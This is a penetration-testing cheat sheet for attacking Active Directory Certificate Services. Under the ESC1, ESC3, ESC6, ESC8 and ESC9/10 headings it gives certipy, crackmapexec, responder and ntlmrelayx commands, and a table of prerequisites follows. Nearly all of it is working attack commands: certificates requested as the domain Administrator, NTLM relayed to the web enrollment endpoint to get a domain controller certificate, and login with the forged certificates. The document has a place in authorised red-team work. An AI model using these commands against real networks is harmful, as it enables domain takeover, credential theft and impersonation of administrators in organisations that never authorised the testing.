# ADCS (Active Directory Certificate Services)

## Enumerate ADCS
```bash
crackmapexec ldap $DC_IP -u user -p pass -M adcs
certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP -stdout
```

## ESC1 - Misconfigured Template (Supply in Request SAN)
```bash
certipy req -u user@$DOMAIN -p password -ca CA-SERVER -template VULN_TEMPLATE -target $DC_IP -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## ESC3 - Enrollment Agent
```bash
certipy req -u user@$DOMAIN -p password -ca CA-SERVER -template User -target $DC_IP -on-behalf-of 'DOMAIN\Administrator'
```

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
```bash
certipy req -u user@$DOMAIN -p password -ca CA-SERVER -template User -target $DC_IP -upn administrator@$DOMAIN
```

## ESC8 - NTLM Relay to ADCS Web Enrollment
```bash
responder -I tun0 --lm
impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
certipy auth -pfx MACHINE.pfx -dc-ip $DC_IP
```

## ESC9/10 - No Security Extension / Weak Mapping
```bash
certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP
```

| ESC | Name | Prerequisite |
|---|---|---|
| ESC1 | Misconfigured CT + SAN | Enroll + Supply in Request |
| ESC2 | Any purpose EKU | Enroll with Any Purpose EKU |
| ESC3 | Enrollment Agent | Enroll on Agent template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag set |
| ESC8 | NTLM Relay to HTTP | Web enrollment + auth trigger |
| ESC9/10 | No Security Extension | Specific config |
